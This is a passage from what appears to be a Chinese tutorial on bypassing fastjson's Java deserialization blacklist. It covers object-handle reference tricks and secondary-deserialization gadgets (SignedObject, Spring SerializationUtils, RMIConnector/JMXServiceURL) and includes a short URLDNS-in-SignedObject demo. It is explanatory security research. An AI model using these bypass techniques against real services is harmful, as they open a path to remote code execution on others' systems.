<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(<span class="keyword">final</span> java.io.ObjectInputStream in)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// 1) 预检测/初始化：确认 SecureObjectInputStream 能否在当前环境正确工作</span></span><br><span class="line">    JSONObject.SecureObjectInputStream.ensureFields();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若“安全字段”可用且初始化未报错，走安全包装路径</span></span><br><span class="line">    <span class="keyword">if</span> (JSONObject.SecureObjectInputStream.fields != <span class="literal">null</span></span><br><span class="line">            &amp;&amp; !JSONObject.SecureObjectInputStream.fields_error) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 用“安全版 OIS”包装原始流：通常会重写 resolveClass/resolveProxyClass 等</span></span><br><span class="line">        <span class="comment">// 在类型解析环节做白/黑名单检查，提前阻断危险类型</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">secIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>.SecureObjectInputStream(in);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在受限输入流上执行默认反序列化（只读本类声明的可持久化字段）</span></span><br><span class="line">        secIn.defaultReadObject();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 回退路径：直接在原始流上做默认反序列化</span></span><br><span class="line">    in.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 随后对关键容器中的元素逐个做 autoType 复核（补救式的运行时校验）</span></span><br><span class="line">    <span class="keyword">for</span> (Object item : list) &#123;</span><br><span class="line">        <span class="keyword">if</span> (item != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 以实际运行时类名做 autoType 检查：</span></span><br><span class="line">            <span class="comment">// - 命中黑名单或未启用/未匹配白名单将抛出 JSONException/安全异常</span></span><br><span class="line">            <span class="comment">// - 第二个参数 expectClass 传 null，按全局配置判定</span></span><br><span class="line">            ParserConfig.global.checkAutoType(item.getClass().getName(), <span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 Java 反序列化的过程中，如果一个类不是 <code>unshared</code>，那么这个类一旦加载并实例化后，会被放在对象句柄表（<code>handles</code>）中。</p>
<p>例如对于普通对象，<code>readNonProxyDesc</code> 函数调用 <code>resolveClass</code> 根据 <code>ObjectStreamClass</code> 中的信息从本地加载类，然后通过 <code>desc.initNonProxy</code> 将加载的类放到了 <code>ObjectStreamClass</code> 中。而 <code>ObjectStreamClass</code> 存放在对象句柄表 <code>handles</code> 中。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2) 创建空的 OSC，并分配句柄（unshared 时登记特殊标记以禁止后续回引）</span></span><br><span class="line"><span class="type">ObjectStreamClass</span> <span class="variable">desc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectStreamClass</span>();</span><br><span class="line"><span class="type">int</span> <span class="variable">descHandle</span> <span class="operator">=</span> handles.assign(unshared ? unsharedMarker : desc);</span><br><span class="line"><span class="comment">// 在真正完成前，passHandle 暂置为空，避免“半成品”被使用</span></span><br><span class="line">passHandle = NULL_HANDLE;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3) 读取“类描述符主体”（classDescBody）</span></span><br><span class="line"><span class="comment">//    - 等价于写端的 writeClassDescriptor(desc)</span></span><br><span class="line"><span class="comment">//    - 包括：类名、serialVersionUID、flags、字段表等</span></span><br><span class="line"><span class="type">ObjectStreamClass</span> <span class="variable">readDesc</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    readDesc = readClassDescriptor();</span><br><span class="line">&#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">    <span class="comment">// 读取“主体”阶段就需要加载某些类型签名，失败则包装为 InvalidClassException</span></span><br><span class="line">    <span class="keyword">throw</span> (IOException) <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(</span><br><span class="line">        <span class="string">&quot;failed to read class descriptor&quot;</span>).initCause(ex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4) 尝试把描述符解析为本地 Class，并做包访问校验</span></span><br><span class="line">Class&lt;?&gt; cl = <span class="literal">null</span>;</span><br><span class="line"><span class="type">ClassNotFoundException</span> <span class="variable">resolveEx</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 切到块数据模式，准备读取/跳过“类注解块”（classAnnotations）</span></span><br><span class="line">bin.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">checksRequired</span> <span class="operator">=</span> isCustomSubclass(); <span class="comment">// 自定义子类需做额外的包访问检查</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// resolveClass：把 readDesc 指向的类名解析为本地 Class（可被子类覆盖）</span></span><br><span class="line">    <span class="keyword">if</span> ((cl = resolveClass(readDesc)) == <span class="literal">null</span>) &#123;</span><br><span class="line">        resolveEx = <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="string">&quot;null class&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (checksRequired) &#123;</span><br><span class="line">        <span class="comment">// 安全：自定义子类时校验包访问权限，避免越权加载敏感包</span></span><br><span class="line">        ReflectUtil.checkPackageAccess(cl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">    resolveEx = ex; <span class="comment">// 暂存，稍后绑定到描述符句柄</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 6) 读取“父类描述符”，并初始化 OSC</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    totalObjectRefs++; <span class="comment">// 统计（供过滤器限额评估）</span></span><br><span class="line">    depth++;           <span class="comment">// 嵌套深度（控制回调/异常传播范围）</span></span><br><span class="line">    <span class="comment">// initNonProxy：将“读取到的主体信息 + 解析到的 Class（或异常） +</span></span><br><span class="line">    <span class="comment">//               父类描述符”组合进当前描述符</span></span><br><span class="line">    desc.initNonProxy(readDesc, cl, resolveEx, readClassDesc(<span class="literal">false</span>));</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    depth--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 7) 标记该描述符构建完成，允许后续通过句柄回引；设置 passHandle 并返回</span></span><br><span class="line">handles.finish(descHandle);</span><br><span class="line">passHandle = descHandle;</span><br></pre></td></tr></table></figure></div>

<p>而后续相同的对象在序列化数据中是以“对象句柄引用”的形式存在，因此在反序列化的时候走的是 <code>readHandle</code> 逻辑直接根据句柄值从 <code>handles</code> 中取对象并返回，因此不会调用到 <code>resolveClass</code> 或 <code>resolveProxyClass</code> 函数加载类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查出该句柄所对应的对象</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> handles.lookupObject(passHandle);</span><br></pre></td></tr></table></figure></div>

<p>因此我们可以向 <code>List</code>、<code>Set</code>、<code>Map</code> 等类型的容器中分别添加 <code>TemplatesImpl</code> 和前面构造的 <code>JsonArray</code>，确保 <code>JsonArray</code> 中的 <code>TemplatesImpl</code> 是对象引用即可绕过。</p>
<h4 id="二次反序列化"><a href="#二次反序列化" class="headerlink" title="二次反序列化"></a>二次反序列化</h4><p>二次反序列化指的是不使用检测黑名单的 <code>ObjectInputStream</code> 去加载序列化对象，而是找到一条可以触发 <code>readObject</code> 的链子，用原生的 <code>ObjectInputStream</code> 去 <code>resolveClass</code>。</p>
<h5 id="SignedObject"><a href="#SignedObject" class="headerlink" title="SignedObject"></a>SignedObject</h5><p><code>java.security.SignedObject#getObject</code> 可以触发反序列化。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">SignedObject</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">SignedObject</span><span class="params">(Serializable object, PrivateKey signingKey,</span></span><br><span class="line"><span class="params">                        Signature signingEngine)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, InvalidKeyException, SignatureException &#123;</span><br><span class="line">            <span class="comment">// creating a stream pipe-line, from a to b</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutput</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(b);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// write and flush the object content to byte array</span></span><br><span class="line">            a.writeObject(object);</span><br><span class="line">            a.flush();</span><br><span class="line">            a.close();</span><br><span class="line">            <span class="built_in">this</span>.content = b.toByteArray();</span><br><span class="line">            b.close();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// now sign the encapsulated object</span></span><br><span class="line">            <span class="built_in">this</span>.sign(signingKey, signingEngine);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">            java.io.ObjectInputStream.<span class="type">GetField</span> <span class="variable">fields</span> <span class="operator">=</span> s.readFields();</span><br><span class="line">            content = ((<span class="type">byte</span>[])fields.get(<span class="string">&quot;content&quot;</span>, <span class="literal">null</span>)).clone();</span><br><span class="line">            signature = ((<span class="type">byte</span>[])fields.get(<span class="string">&quot;signature&quot;</span>, <span class="literal">null</span>)).clone();</span><br><span class="line">            thealgorithm = (String)fields.get(<span class="string">&quot;thealgorithm&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// creating a stream pipe-line, from b to a</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(<span class="built_in">this</span>.content);</span><br><span class="line">        <span class="type">ObjectInput</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(b);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> a.readObject();</span><br><span class="line">        b.close();</span><br><span class="line">        a.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>SignedObject</code> 构造函数将 <code>object</code> 序列化后保存在 <code>content</code> 属性。</li>
<li><code>readObject</code> 将序列化数据 <code>content</code> 原封不动的恢复到 <code>content</code> 属性。</li>
<li><code>getObject</code> 函数将 <code>content</code> 中的序列化数据反序列化。</li>
</ul>
<p>因此我们只需要寻找一个能够执行类的 <code>getObject</code> 方法的利用链即可。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">KeyPairGenerator keyPairGenerator;</span><br><span class="line">keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line"><span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line"><span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();</span><br><span class="line"><span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line"><span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>((Serializable) URLDNS.getObject(<span class="string">&quot;http://www.example.com&quot;</span>), privateKey, signingEngine);</span><br><span class="line"></span><br><span class="line">signedObject.getObject();</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <p><code>signedObject</code> 的反序列化并不能触发二次反序列化，真正触发二次反序列化的条件是 <code>getObject</code> 方法的调用。</p>

    </div>
  </div>

<h5 id="SerializationUtils"><a href="#SerializationUtils" class="headerlink" title="SerializationUtils"></a>SerializationUtils</h5><p><code>org.springframework.util.SerializationUtils#deserialize</code> 可以将参数反序列化。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserialize</span><span class="params">(<span class="meta">@Nullable</span> <span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (bytes == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> (<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes))) &#123;</span><br><span class="line">        <span class="keyword">return</span> ois.readObject();</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h5 id="RMIConnector"><a href="#RMIConnector" class="headerlink" title="RMIConnector"></a>RMIConnector</h5><p>在 <code>javax.management.remote.rmi.RMIConnector</code> 中， <code>connect()</code> 方法能触发 <code>findRMIServer</code> 函数调用且参数是 <code>jmxServiceURL</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> JMXServiceURL jmxServiceURL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">connect</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    connect(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">connect</span><span class="params">(Map&lt;String,?&gt; environment)</span></span><br><span class="line"><span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="type">RMIServer</span> <span class="variable">stub</span> <span class="operator">=</span> (rmiServer!=<span class="literal">null</span>)?rmiServer:</span><br><span class="line">        findRMIServer(jmxServiceURL, usemap);</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><code>JMXServiceURL</code> 用来表示 <strong>JMX API 连接器服务器的地址</strong>。该地址是符合 SLP 的<strong>抽象服务 URL</strong>（Abstract Service URL），其定义见 RFC 2609，并由 RFC 3111 修订。它必须形如：<code>service:jmx:protocol:sap</code></p>
<ul>
<li><strong>protocol</strong>：用于连接到连接器服务器的<strong>传输协议</strong>。它是由一个或多个 ASCII 字符组成的字符串；每个字符要么是字母、数字，或字符 <strong><code>+</code><strong>、</strong><code>-</code><strong>。</strong>第一个字符必须是字母</strong>。大写字母会被转换为小写。</li>
<li><strong>sap</strong>：连接器服务器所在的<strong>地址</strong>。该地址使用了 RFC 2609 中为基于 IP 的协议所定义语法的一个<strong>子集</strong>，支持的语法为：<code>//[host[:port]][url-path]</code><ul>
<li><strong>host</strong>：可以是主机名、IPv4 数字地址，或用方括号包裹的 IPv6 数字地址（如 <code>[2001:db8::1]</code>）。</li>
<li><strong>port</strong>：十进制端口号。<strong>0</strong> 表示<strong>默认端口</strong>或<strong>匿名端口</strong>（取决于具体协议）。</li>
<li><strong>host</strong> 与 <strong>port</strong> 都可以省略；但<strong>不能只有端口而没有主机</strong>。</li>
<li><strong>url-path</strong>（如果有）以斜杠 <strong><code>/</code></strong> 或分号 <strong><code>;</code></strong> 开头，并一直延续到地址末尾。它可以包含使用 RFC 2609 规定的分号语法的<strong>属性</strong>。<strong>本类不会解析</strong>这些属性，也不会检测属性语法是否正确。</li>
</ul>
</li>
</ul>
<p>我们可以从 <code>JMXServiceURL</code> 分析出该类型 URL 的语法规则：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;通过解析 Service URL 字符串来构造一个 &#123;<span class="doctag">@code</span> JMXServiceURL&#125;。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> serviceURL 要解析的 URL 字符串。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> NullPointerException</span></span><br><span class="line"><span class="comment"> *         如果 &#123;<span class="doctag">@code</span> serviceURL&#125; 为 null。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> MalformedURLException</span></span><br><span class="line"><span class="comment"> *         如果 &#123;<span class="doctag">@code</span> serviceURL&#125; 不符合“抽象 Service URL”的语法，</span></span><br><span class="line"><span class="comment"> *         或者不是一个有效的 JMX Remote API 服务名。</span></span><br><span class="line"><span class="comment"> *         合法的 &#123;<span class="doctag">@code</span> JMXServiceURL&#125; 必须以 &#123;<span class="doctag">@code</span> &quot;service:jmx:&quot;&#125;</span></span><br><span class="line"><span class="comment"> *         开头（大小写不敏感），且不得包含任何不可打印的 ASCII 字符。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">JMXServiceURL</span><span class="params">(String serviceURL)</span> <span class="keyword">throws</span> MalformedURLException &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">serviceURLLength</span> <span class="operator">=</span> serviceURL.length();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 按 RFC 2609 检查 URL 中是否存在非 ASCII 的字符。</span></span><br><span class="line"><span class="comment">       这里限定为“可打印 ASCII 字符”：</span></span><br><span class="line"><span class="comment">       范围是 [0x20, 0x7E]；也就是 &lt; 0x20 或 &gt;= 0x7F 都非法。 */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; serviceURLLength; i++) &#123;</span><br><span class="line">        <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> serviceURL.charAt(i);</span><br><span class="line">        <span class="keyword">if</span> (c &lt; <span class="number">32</span> || c &gt;= <span class="number">127</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MalformedURLException</span>(<span class="string">&quot;Service URL contains &quot;</span> +</span><br><span class="line">                                            <span class="string">&quot;non-ASCII character 0x&quot;</span> +</span><br><span class="line">                                            Integer.toHexString(c));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析并校验必须的前缀：&quot;service:jmx:&quot;（大小写不敏感）</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">requiredPrefix</span> <span class="operator">=</span> <span class="string">&quot;service:jmx:&quot;</span>;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">requiredPrefixLength</span> <span class="operator">=</span> requiredPrefix.length();</span><br><span class="line">    <span class="keyword">if</span> (!serviceURL.regionMatches(<span class="literal">true</span>,         <span class="comment">// ignore case：忽略大小写</span></span><br><span class="line">                                  <span class="number">0</span>,            <span class="comment">// serviceURL 起始偏移</span></span><br><span class="line">                                  requiredPrefix,</span><br><span class="line">                                  <span class="number">0</span>,            <span class="comment">// requiredPrefix 起始偏移</span></span><br><span class="line">                                  requiredPrefixLength)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MalformedURLException</span>(<span class="string">&quot;Service URL must start with &quot;</span> +</span><br><span class="line">                                        requiredPrefix);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析协议名（protocol），位于 &quot;service:jmx:&quot; 之后、&quot;://&quot; 之前</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">protoStart</span> <span class="operator">=</span> requiredPrefixLength;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">protoEnd</span> <span class="operator">=</span> indexOf(serviceURL, <span class="string">&#x27;:&#x27;</span>, protoStart);</span><br><span class="line">    <span class="built_in">this</span>.protocol =</span><br><span class="line">        serviceURL.substring(protoStart, protoEnd).toLowerCase();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 协议名之后必须紧跟 &quot;://&quot;</span></span><br><span class="line">    <span class="keyword">if</span> (!serviceURL.regionMatches(protoEnd, <span class="string">&quot;://&quot;</span>, <span class="number">0</span>, <span class="number">3</span>)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MalformedURLException</span>(<span class="string">&quot;Missing \&quot;://\&quot; after &quot;</span> +</span><br><span class="line">                                        <span class="string">&quot;protocol name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析主机名（host）</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">hostStart</span> <span class="operator">=</span> protoEnd + <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> hostEnd;</span><br><span class="line">    <span class="keyword">if</span> (hostStart &lt; serviceURLLength</span><br><span class="line">        &amp;&amp; serviceURL.charAt(hostStart) == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">        <span class="comment">// 形如：[... ] —— 按 RFC 3986 的 IPv6 地址字面量</span></span><br><span class="line">        hostEnd = serviceURL.indexOf(<span class="string">&#x27;]&#x27;</span>, hostStart) + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (hostEnd == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MalformedURLException</span>(<span class="string">&quot;Bad host name: [ without ]&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.host = serviceURL.substring(hostStart + <span class="number">1</span>, hostEnd - <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 